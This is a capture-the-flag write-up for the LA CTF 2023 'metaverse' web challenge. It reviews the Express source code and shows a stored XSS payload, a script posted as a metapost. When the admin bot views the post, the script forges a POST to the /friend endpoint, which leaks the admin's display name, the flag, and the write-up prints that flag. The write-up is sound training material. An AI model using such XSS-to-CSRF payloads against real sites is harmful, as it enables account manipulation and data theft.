# metaverse

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

- 346 solves / 236 points

## Background

> Author: aplet123

Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you're good to metago.

[metaverse.lac.tf](https://metaverse.lac.tf)

You can metause our fancy new [metaadmin metabot](https://admin-bot.lac.tf/metaverse) to get the admin to metaview your metapost!

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211122113.png)

## Enumeration

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/raw/main/LA-CTF-2023/Web/metaverse/index.js):**
```shell
┌[siunam♥earth]-(~/ctf/LA-CTF-2023/Web/metaverse)-[2023.02.11|12:21:45(HKT)]
└> file index.js
index.js: JavaScript source, ASCII text
```

But before we look at that JavaScript source code, let's check out the home page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211122236.png)

Oof, it hurts my eyes.

Anyway, when we go to `/`, it redirects us to `/login`.

In here, we can login to **meta**, and register a **meta** account.

**Let's try to register an account:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211124915.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211125025.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211125035.png)

As you can see, we can add a friend to **metafriend**, and create a new **metapost**.

**We can try to add a friend:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211125404.png)

In here, **we see the username and display name is being _reflected_ to the page.**

**Then, we can try to create a new post:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211125733.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211125818.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211125830.png)

When we created a new post, it'll open a new tab to `/post/<uuid>`, and append our new post to **metapost list**.

Now, we can look at the source code.

**In line 1 - 5, we see this:**
```js
const express = require("express");
const path = require("path");
const fs = require("fs");
const cookieParser = require("cookie-parser");
const { v4: uuid } = require("uuid");
```

The web application is using Express as the back-end.

**In line 7 - 9, we see this:**
```js
const flag = process.env.FLAG;
const port = parseInt(process.env.PORT) || 8080;
const adminpw = process.env.ADMINPW || "placeholder";
```

In here, we see **the flag is in the machine's environment variable.** Then, the `adminpw` is from the environment variable, or "placeholder".

**In line 11 - 17, we see this:**
```js
const accounts = new Map();
accounts.set("admin", {
    password: adminpw,
    displayName: flag,
    posts: [],
    friends: [],
});
```

So, the `displayname` is the flag!

***Armed with above information, our final goal is to get admin's display name!***

**In line 24 - 38, we see this:**
```js
setInterval(() => {
    const now = Date.now();
    let i = cleanup.findIndex((x) => now < x[1]);
    if (i === -1) {
        i = cleanup.length;
    }
    for (let j = 0; j < i; j++) {
        const account = accounts.get(cleanup[i][0]);
        for (const post of account.posts) {
            posts.delete(post);
        }
        accounts.delete(cleanup[i][0]);
    }
    cleanup = cleanup.slice(i);
}, 1000 * 60);
```

Hmm... **Every minute, it'll cleanup account's post?**

***In line 61 - 69, we see something weird:***
```js
// templating engines are for losers!
const postTemplate = fs.readFileSync(path.join(__dirname, "post.html"), "utf8");
app.get("/post/:id", (req, res) => {
    if (posts.has(req.params.id)) {
        res.type("text/html").send(postTemplate.replace("$CONTENT", () => posts.get(req.params.id)));
    } else {
        res.status(400).type("text/html").send(postTemplate.replace("$CONTENT", "post not found :("));
    }
});
```

The first line will read file from `post.html`, which is a post template file.

Then, in route (path) `/post/<id>`, **if the request's GET parameter `id` is supplied, replace the post content to the template one.**

***Hmm... I can smell some SSTI (Server-Side Template Injection) vulnerabilities!***

**In line 81 - 101, we see this:**
```js
app.post("/register", (req, res) => {
    if (typeof req.body.username !== "string" || typeof req.body.password !== "string" || typeof req.body.displayName !== "string") {
        res.redirect("/login#" + encodeURIComponent("Please metafill out all the metafields."));
        return;
    }
    const username = req.body.username.trim();
    const password = req.body.password.trim();
    const displayName = req.body.displayName.trim();
    if (!/^[\w]{3,32}$/.test(username) || !/^[-\w !@#$%^&*()+]{3,32}$/.test(password) || !/^[-\w ]{3,64}/.test(displayName)) {
        res.redirect("/login#" + encodeURIComponent("Invalid metavalues provided for metafields."));
        return;
    }
    if (accounts.has(username)) {
        res.redirect("/login#" + encodeURIComponent("Metaaccount already metaexists."));
        return;
    }
    accounts.set(username, { password, displayName, posts: [], friends: [] });
    cleanup.push([username, Date.now() + 1000 * 60 * 60 * 12]);
    res.cookie("login", `${username}:${password}`, { httpOnly: true });
    res.redirect("/");
});
```

In the `/register` route, when a POST request is sent, it'll check the `username`, `password`, or `displayName` is a string or not.

Then, it checks the `username` has 3 - 32 character set of `A-Za-z0-9_`. `password` and `displayName` are similar to `username`.

After that, set a new cookie called `login`, with value `username:password`, and **`HttpOnly` attribute is set to true**.

**In line 134 - 146, we see this:**
```js
app.post("/post", needsAuth, (req, res) => {
    res.type("text/plain");
    const id = uuid();
    const content = req.body.content;
    if (typeof content !== "string" || content.length > 1000 || content.length === 0) {
        res.status(400).send("Invalid metacontent");
    } else {
        const user = accounts.get(res.locals.user);
        posts.set(id, content);
        user.posts.push(id);
        res.send(id);
    }
});
```

In the `/post` route, when a POST request is sent, it'll check the body content is a string data type, content length is greater than 1000, and equals to 0.

If not, then create a new post with a UUID value.

Armed with above information, we can try to get the flag!

## Exploitation

**In this challenge's description, we can send a URL to the admin bot to view our metapost:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211130539.png)

***So, we need to find some client-side vulnerability, like XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery).*** This would enable us to read the bot's cookie.

However, **remeber the cookie's `HttpOnly` attribute is set to true?** That being said, we can't use the JavaScript [`document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) API to access the admin bot's cookie:

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211140817.png)

Luckly, **the flag is the admin bot's display name**, if we somehow **leak it**, we can get the flag!!

But how??

In the **metaposts** function, **we don't see any CSRF token and other CSRF protection**, so theoretically we can craft an evil HTML page that'll send the admin bot's username upon visit.

**Now, let's try to inject some HTML code that'll execute JavaScript code, which will pop up an alert box:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211131902.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211131913.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211131919.png)

It worked in the `/post/<uuid>`!

Alright, let's take a step back.

In `/`, we can add a friend to metafriends. However, when we add someone to metafriend, we won't see him/her username and display name.

**To see that, he/she MUST add a friend to us!**

***Armed with above information, we can craft a payload that when the admin bot visit, it'll send a POST request to `/friend`, with parameter `username=<your_username>`. That way, we can see it's display name!!*** This can happen is because it doesn't have any CSRF protection!

**Payload:**
```html
<script>
    // Wait the window is fully loaded
    window.onload = function (){
        var username = 'siunam';

        // Construct the require POST parameters
        var data = 'username=' + encodeURIComponent(username);

        // Add our username to friend list upon visit
        fetch('https://metaverse.lac.tf/friend',
            {
                method: 'POST',
                mode: 'no-cors',
                body: data,
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                }
            }
        )
    };
</script>
```

**Let's copy and paste that to the metapost, and create it!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211142751.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211142804.png)

**Then, copy the URL, and send to the admin bot:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211142823.png)

**Finally, we should see the admin bot added to our friend list!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/LA-CTF-2023/images/Pasted%20image%2020230211142913.png)

Nice!! We got the flag!

- Flag: `lactf{please_metaget_me_out_of_here}`

# Conclusion

What we've learned:

1. Leveraging Stored XSS To Perform CSRF attack